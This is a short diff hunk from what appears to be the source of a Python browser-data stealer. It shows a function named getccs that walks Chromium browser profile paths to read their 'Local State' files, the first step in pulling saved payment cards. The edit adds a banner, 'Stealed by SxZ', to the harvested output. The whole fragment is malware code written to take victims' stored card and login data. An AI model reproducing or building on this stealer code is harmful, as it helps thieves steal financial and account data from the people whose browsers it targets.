@@ -549,7 +549,7 @@ if yes == "yes":
 				return ""
 	def getccs():
 		try:
-			ccss = ""
+			ccss = "==============Stealed by SxZ==============="
 			for i in range(len(chromiumpaths)):
 				print(i)
 				local_state_path = chromiumpaths[i]  + "\\Local State"
